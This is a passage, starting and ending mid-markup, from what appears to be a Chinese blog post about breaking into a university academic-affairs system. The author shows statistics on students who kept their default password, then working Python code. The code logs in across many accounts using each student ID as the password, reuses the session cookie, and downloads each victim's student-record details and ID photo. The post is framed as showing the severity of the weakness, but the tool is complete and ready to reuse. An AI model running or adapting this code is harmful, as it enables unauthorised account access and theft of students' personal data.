style=\"text-align:center\">1759</td>\r\n<td style=\"text-align:center\">303</td>\r\n<td style=\"text-align:center\">17.23%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">6</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2015</td>\r\n<td style=\"text-align:center\">1643</td>\r\n<td style=\"text-align:center\">620</td>\r\n<td style=\"text-align:center\">37.74%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">7</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2016</td>\r\n<td style=\"text-align:center\">1605</td>\r\n<td style=\"text-align:center\">1434</td>\r\n<td style=\"text-align:center\">89.35%</td>\r\n</tr>\r\n<tr>\r\n<td style=\"text-align:center\">8</td>\r\n<td style=\"text-align:center\">本三</td>\r\n<td style=\"text-align:center\">2017</td>\r\n<td style=\"text-align:center\">1552</td>\r\n<td style=\"text-align:center\">639</td>\r\n<td style=\"text-align:center\">41.17%</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><strong>介于初衷，只爬了 10 个账号的信息，以示严重性！</strong></p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"爬到的学籍信息\"></p>\r\n<h2 id=\"h2-u8FC7u7A0B\"><a name=\"过程\" class=\"reference-link\"></a><span class=\"header-link octicon octicon-link\"></span>过程</h2><p>本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。</p>\r\n<p>Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。</p>\r\n<p>这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"系统的登录界面\"></p>\r\n<p>首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"登录请求 ( POST )\"></p>\r\n<p>登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"表单参数\"></p>\r\n<p>服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"登录的响应体\"></p>\r\n<p>刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。</p>\r\n<p>先引入依赖</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"kwd\">import</span><span class=\"pln\"> sys</span></code></li><li class=\"L1\"><code><span class=\"kwd\">import</span><span class=\"pln\"> logging</span></code></li><li class=\"L2\"><code><span class=\"kwd\">import</span><span class=\"pln\"> gevent</span></code></li><li class=\"L3\"><code><span class=\"kwd\">import</span><span class=\"pln\"> urllib3</span></code></li><li class=\"L4\"><code><span class=\"kwd\">import</span><span class=\"pln\"> pathlib</span></code></li><li class=\"L5\"><code><span class=\"kwd\">from</span><span class=\"pln\"> PIL </span><span class=\"kwd\">import</span><span class=\"pln\"> </span><span class=\"typ\">Image</span></code></li><li class=\"L6\"><code><span class=\"kwd\">from</span><span class=\"pln\"> io </span><span class=\"kwd\">import</span><span class=\"pln\"> </span><span class=\"typ\">BytesIO</span></code></li><li class=\"L7\"><code><span class=\"kwd\">from</span><span class=\"pln\"> lxml </span><span class=\"kwd\">import</span><span class=\"pln\"> etree</span></code></li></ol></pre><p>创建 HTTP 连接池</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> urllib3</span><span class=\"pun\">.</span><span class=\"typ\">HTTPConnectionPool</span><span class=\"pun\">(</span></code></li><li class=\"L1\"><code><span class=\"pln\">    host</span><span class=\"pun\">=</span><span class=\"pln\">settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_HOST</span><span class=\"pun\">,</span></code></li><li class=\"L2\"><code><span class=\"pln\">    port</span><span class=\"pun\">=</span><span class=\"pln\">settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_PORT</span><span class=\"pun\">,</span></code></li><li class=\"L3\"><code><span class=\"pln\">    strict</span><span class=\"pun\">=</span><span class=\"kwd\">False</span><span class=\"pun\">,</span></code></li><li class=\"L4\"><code><span class=\"pln\">    maxsize</span><span class=\"pun\">=</span><span class=\"lit\">100</span><span class=\"pun\">,</span></code></li><li class=\"L5\"><code><span class=\"pln\">    block</span><span class=\"pun\">=</span><span class=\"kwd\">False</span><span class=\"pun\">,</span></code></li><li class=\"L6\"><code><span class=\"pln\">    retries</span><span class=\"pun\">=</span><span class=\"lit\">100</span><span class=\"pun\">,</span></code></li><li class=\"L7\"><code><span class=\"pln\">    timeout</span><span class=\"pun\">=</span><span class=\"lit\">10</span></code></li><li class=\"L8\"><code><span class=\"pun\">)</span></code></li></ol></pre><p>请求头的一些固定信息可以预先设定好，伪装浏览器</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"pln\">header </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\'Accept\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\'</span><span class=\"pun\">,</span></code></li><li class=\"L1\"><code><span class=\"pln\">    </span><span class=\"str\">\'Accept-Encoding\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'gzip, deflate\'</span><span class=\"pun\">,</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"str\">\'Accept-Language\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\'</span><span class=\"pun\">,</span></code></li><li class=\"L3\"><code><span class=\"pln\">    </span><span class=\"str\">\'Cache-Control\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'max-age=0\'</span><span class=\"pun\">,</span></code></li><li class=\"L4\"><code><span class=\"pln\">    </span><span class=\"str\">\'Connection\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'Keep-alive\'</span><span class=\"pun\">,</span></code></li><li class=\"L5\"><code><span class=\"pln\">    </span><span class=\"str\">\'Host\'</span><span class=\"pun\">:</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">SERVER_HOST</span><span class=\"pun\">,</span></code></li><li class=\"L6\"><code><span class=\"pln\">    </span><span class=\"str\">\'Upgrade-Insecure-Requests\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'1\'</span><span class=\"pun\">,</span></code></li><li class=\"L7\"><code><span class=\"pln\">    </span><span class=\"str\">\'User-Agent\'</span><span class=\"pun\">:</span><span class=\"pln\"> </span><span class=\"str\">\'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\'</span></code></li><li class=\"L8\"><code><span class=\"pun\">}</span></code></li></ol></pre><p>登录并验证是否是初始密码</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"com\"># 账号校验器</span></code></li><li class=\"L1\"><code><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">InfoValidate</span><span class=\"pun\">(</span><span class=\"kwd\">object</span><span class=\"pun\">):</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> __init__</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">):</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">logger</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">http</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 有效账号</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"com\"># 可爬账号</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_available </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L9\"><code></code></li><li class=\"L0\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> validate</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> all_account</span><span class=\"pun\">):</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"com\"># 将所有校验过程加入队列</span></code></li><li class=\"L2\"><code><span class=\"pln\">        jobs </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"pln\">gevent</span><span class=\"pun\">.</span><span class=\"pln\">spawn</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">validate_account</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">,</span><span class=\"pln\"> a</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"kwd\">for</span><span class=\"pln\"> a </span><span class=\"kwd\">in</span><span class=\"pln\"> all_account</span><span class=\"pun\">]</span></code></li><li class=\"L3\"><code><span class=\"pln\">        gevent</span><span class=\"pun\">.</span><span class=\"pln\">joinall</span><span class=\"pun\">(</span><span class=\"pln\">jobs</span><span class=\"pun\">,</span><span class=\"pln\"> timeout</span><span class=\"pun\">=</span><span class=\"lit\">0</span><span class=\"pun\">)</span></code></li><li class=\"L4\"><code></code></li><li class=\"L5\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> validate_account</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> http</span><span class=\"pun\">,</span><span class=\"pln\"> account</span><span class=\"pun\">):</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"com\"># 登录请求参数</span></code></li><li class=\"L7\"><code><span class=\"pln\">        param </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\"zjh\"</span><span class=\"pun\">:</span><span class=\"pln\"> account</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\"mm\"</span><span class=\"pun\">:</span><span class=\"pln\"> account</span><span class=\"pun\">}</span></code></li><li class=\"L8\"><code><span class=\"pln\">        header </span><span class=\"pun\">=</span><span class=\"pln\"> headers</span><span class=\"pun\">.</span><span class=\"pln\">header</span></code></li><li class=\"L9\"><code><span class=\"pln\">        response </span><span class=\"pun\">=</span><span class=\"pln\"> http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGIN</span><span class=\"pun\">,</span><span class=\"pln\"> fields</span><span class=\"pun\">=</span><span class=\"pln\">param</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\'发送请求&gt;&gt;{}\'</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">param</span><span class=\"pun\">))</span></code></li><li class=\"L1\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"pln\">response</span><span class=\"pun\">.</span><span class=\"pln\">status</span><span class=\"pun\">)</span></code></li><li class=\"L2\"><code><span class=\"pln\">        </span><span class=\"com\"># 响应体解码</span></code></li><li class=\"L3\"><code><span class=\"pln\">        res_text </span><span class=\"pun\">=</span><span class=\"pln\"> response</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">.</span><span class=\"pln\">decode</span><span class=\"pun\">(</span><span class=\"str\">\'GB2312\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'ignore\'</span><span class=\"pun\">)</span></code></li><li class=\"L4\"><code></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> res_text</span><span class=\"pun\">.</span><span class=\"pln\">find</span><span class=\"pun\">(</span><span class=\"str\">\'密码不正确\'</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">&gt;</span><span class=\"pln\"> </span><span class=\"pun\">-</span><span class=\"lit\">1</span><span class=\"pun\">:</span></code></li><li class=\"L6\"><code><span class=\"pln\">            </span><span class=\"com\"># 密码有误</span></code></li><li class=\"L7\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">elif</span><span class=\"pln\"> </span><span class=\"kwd\">not</span><span class=\"pln\"> res_text</span><span class=\"pun\">.</span><span class=\"pln\">find</span><span class=\"pun\">(</span><span class=\"str\">\'证件号不存在\'</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">&gt;</span><span class=\"pln\"> </span><span class=\"pun\">-</span><span class=\"lit\">1</span><span class=\"pun\">:</span></code></li><li class=\"L9\"><code><span class=\"pln\">            </span><span class=\"com\"># 账号可爬</span></code></li><li class=\"L0\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_available</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L1\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">account_valid</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">)</span></code></li><li class=\"L2\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\"账号可用&gt;&gt;&gt;{}\"</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">account</span><span class=\"pun\">))</span></code></li></ol></pre><p>至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律</p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"学籍信息页\"></p>\r\n<p><img src=\"http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"table 的结构\"></p>\r\n<p>一系列的信息都包裹在 <code>&lt;td width = \"275\"&gt;&lt;/td&gt;</code>之间，对应的 xpath 表达式即为 <code>//td[starts-with(<a href=\"https://github.com/width\" title=\"@width\" class=\"at-link\">@width</a>,\"275\")]/text()</code></p>\r\n<p>基于之前对账号的测试，爬取学籍信息</p>\r\n<pre class=\"prettyprint linenums prettyprinted\" style=\"\"><ol class=\"linenums\"><li class=\"L0\"><code><span class=\"com\"># 信息收集器</span></code></li><li class=\"L1\"><code><span class=\"kwd\">class</span><span class=\"pln\"> </span><span class=\"typ\">InfoCollect</span><span class=\"pun\">(</span><span class=\"kwd\">object</span><span class=\"pun\">):</span></code></li><li class=\"L2\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> __init__</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">):</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">logger</span></code></li><li class=\"L4\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">InfoMain</span><span class=\"pun\">.</span><span class=\"pln\">http</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 功能模块</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_info </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">MOD_ROLL_INFO</span></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_img </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">MOD_ROLL_IMG</span></code></li><li class=\"L8\"><code></code></li><li class=\"L9\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> get_info_queue</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> accounts</span><span class=\"pun\">):</span></code></li><li class=\"L0\"><code><span class=\"pln\">        </span><span class=\"com\"># 将所有信息收集过程加入队列</span></code></li><li class=\"L1\"><code><span class=\"pln\">        jobs </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"pln\">gevent</span><span class=\"pun\">.</span><span class=\"pln\">spawn</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">get_info</span><span class=\"pun\">,</span><span class=\"pln\"> a</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"kwd\">for</span><span class=\"pln\"> a </span><span class=\"kwd\">in</span><span class=\"pln\"> accounts</span><span class=\"pun\">]</span></code></li><li class=\"L2\"><code><span class=\"pln\">        gevent</span><span class=\"pun\">.</span><span class=\"pln\">joinall</span><span class=\"pun\">(</span><span class=\"pln\">jobs</span><span class=\"pun\">,</span><span class=\"pln\"> timeout</span><span class=\"pun\">=</span><span class=\"lit\">0</span><span class=\"pun\">)</span></code></li><li class=\"L3\"><code></code></li><li class=\"L4\"><code><span class=\"pln\">    </span><span class=\"kwd\">def</span><span class=\"pln\"> get_info</span><span class=\"pun\">(</span><span class=\"kwd\">self</span><span class=\"pun\">,</span><span class=\"pln\"> stuid</span><span class=\"pun\">):</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 登录</span></code></li><li class=\"L6\"><code><span class=\"pln\">        param </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"str\">\'zjh\'</span><span class=\"pun\">:</span><span class=\"pln\"> stuid</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'mm\'</span><span class=\"pun\">:</span><span class=\"pln\"> stuid</span><span class=\"pun\">}</span></code></li><li class=\"L7\"><code><span class=\"pln\">        response </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGIN</span><span class=\"pun\">,</span><span class=\"pln\"> fields</span><span class=\"pun\">=</span><span class=\"pln\">param</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"com\"># 保存 Cookie</span></code></li><li class=\"L9\"><code><span class=\"pln\">        cookie </span><span class=\"pun\">=</span><span class=\"pln\"> response</span><span class=\"pun\">.</span><span class=\"pln\">headers</span><span class=\"pun\">[</span><span class=\"str\">\'Set-Cookie\'</span><span class=\"pun\">].</span><span class=\"pln\">replace</span><span class=\"pun\">(</span><span class=\"str\">\'; path=/\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'\'</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">        header </span><span class=\"pun\">=</span><span class=\"pln\"> headers</span><span class=\"pun\">.</span><span class=\"pln\">header</span></code></li><li class=\"L1\"><code><span class=\"pln\">        header</span><span class=\"pun\">[</span><span class=\"str\">\'cookie\'</span><span class=\"pun\">]</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> cookie</span></code></li><li class=\"L2\"><code><span class=\"pln\">        </span><span class=\"com\"># 学籍信息</span></code></li><li class=\"L3\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_info</span><span class=\"pun\">:</span></code></li><li class=\"L4\"><code><span class=\"pln\">            </span><span class=\"com\"># 带 Cookie 访问学籍信息页</span></code></li><li class=\"L5\"><code><span class=\"pln\">            response_xjxx </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'GET\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_XJXX</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L6\"><code><span class=\"pln\">            text </span><span class=\"pun\">=</span><span class=\"pln\"> response_xjxx</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">.</span><span class=\"pln\">decode</span><span class=\"pun\">(</span><span class=\"str\">\'GB2312\'</span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"str\">\'ignore\'</span><span class=\"pun\">)</span></code></li><li class=\"L7\"><code><span class=\"pln\">            </span><span class=\"com\"># 解析页面内容</span></code></li><li class=\"L8\"><code><span class=\"pln\">            selector </span><span class=\"pun\">=</span><span class=\"pln\"> etree</span><span class=\"pun\">.</span><span class=\"pln\">HTML</span><span class=\"pun\">(</span><span class=\"pln\">text</span><span class=\"pun\">)</span></code></li><li class=\"L9\"><code><span class=\"pln\">            text_arr </span><span class=\"pun\">=</span><span class=\"pln\"> selector</span><span class=\"pun\">.</span><span class=\"pln\">xpath</span><span class=\"pun\">(</span><span class=\"str\">\'//td[starts-with(@width,\"275\")]/text()\'</span><span class=\"pun\">)</span></code></li><li class=\"L0\"><code><span class=\"pln\">            </span><span class=\"com\"># 学籍信息</span></code></li><li class=\"L1\"><code><span class=\"pln\">            result </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"pun\">[]</span></code></li><li class=\"L2\"><code><span class=\"pln\">            </span><span class=\"kwd\">for</span><span class=\"pln\"> info </span><span class=\"kwd\">in</span><span class=\"pln\"> text_arr</span><span class=\"pun\">:</span></code></li><li class=\"L3\"><code><span class=\"pln\">                result</span><span class=\"pun\">.</span><span class=\"pln\">append</span><span class=\"pun\">(</span><span class=\"pln\">info</span><span class=\"pun\">.</span><span class=\"pln\">strip</span><span class=\"pun\">())</span></code></li><li class=\"L4\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">save_info</span><span class=\"pun\">(</span><span class=\"pln\">result</span><span class=\"pun\">)</span></code></li><li class=\"L5\"><code><span class=\"pln\">        </span><span class=\"com\"># 学籍照片</span></code></li><li class=\"L6\"><code><span class=\"pln\">        </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">mod_get_roll_img</span><span class=\"pun\">:</span></code></li><li class=\"L7\"><code><span class=\"pln\">            response_xjzp </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'GET\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_XJZP</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span class=\"pun\">)</span></code></li><li class=\"L8\"><code><span class=\"pln\">            image </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Image</span><span class=\"pun\">.</span><span class=\"pln\">open</span><span class=\"pun\">(</span><span class=\"typ\">BytesIO</span><span class=\"pun\">(</span><span class=\"pln\">response_xjzp</span><span class=\"pun\">.</span><span class=\"pln\">data</span><span class=\"pun\">))</span></code></li><li class=\"L9\"><code><span class=\"pln\">            setpath </span><span class=\"pun\">=</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">PATH_IMG_SAVE</span></code></li><li class=\"L0\"><code><span class=\"pln\">            path </span><span class=\"pun\">=</span><span class=\"pln\"> pathlib</span><span class=\"pun\">.</span><span class=\"typ\">Path</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">)</span></code></li><li class=\"L1\"><code><span class=\"pln\">            </span><span class=\"kwd\">if</span><span class=\"pln\"> </span><span class=\"kwd\">not</span><span class=\"pln\"> path</span><span class=\"pun\">.</span><span class=\"pln\">exists</span><span class=\"pun\">():</span></code></li><li class=\"L2\"><code><span class=\"pln\">                path</span><span class=\"pun\">.</span><span class=\"pln\">mkdir</span><span class=\"pun\">()</span></code></li><li class=\"L3\"><code><span class=\"pln\">            setpath </span><span class=\"pun\">=</span><span class=\"pln\"> setpath </span><span class=\"pun\">+</span><span class=\"pln\"> </span><span class=\"str\">\'/\'</span><span class=\"pln\"> </span><span class=\"pun\">+</span><span class=\"pln\"> stuid </span><span class=\"pun\">+</span><span class=\"pln\"> </span><span class=\"str\">\'.jpg\'</span></code></li><li class=\"L4\"><code><span class=\"pln\">            image</span><span class=\"pun\">.</span><span class=\"pln\">save</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">)</span></code></li><li class=\"L5\"><code><span class=\"pln\">            </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">logger</span><span class=\"pun\">.</span><span class=\"pln\">info</span><span class=\"pun\">(</span><span class=\"str\">\'保存照片&gt;&gt;&gt;{}\'</span><span class=\"pun\">.</span><span class=\"pln\">format</span><span class=\"pun\">(</span><span class=\"pln\">setpath</span><span class=\"pun\">))</span></code></li><li class=\"L6\"><code></code></li><li class=\"L7\"><code><span class=\"pln\">        </span><span class=\"com\"># 登出</span></code></li><li class=\"L8\"><code><span class=\"pln\">        </span><span class=\"kwd\">self</span><span class=\"pun\">.</span><span class=\"pln\">http</span><span class=\"pun\">.</span><span class=\"pln\">request</span><span class=\"pun\">(</span><span class=\"str\">\'POST\'</span><span class=\"pun\">,</span><span class=\"pln\"> settings</span><span class=\"pun\">.</span><span class=\"pln\">URL_LOGOUT</span><span class=\"pun\">,</span><span class=\"pln\"> headers</span><span class=\"pun\">=</span><span class=\"pln\">header</span><span 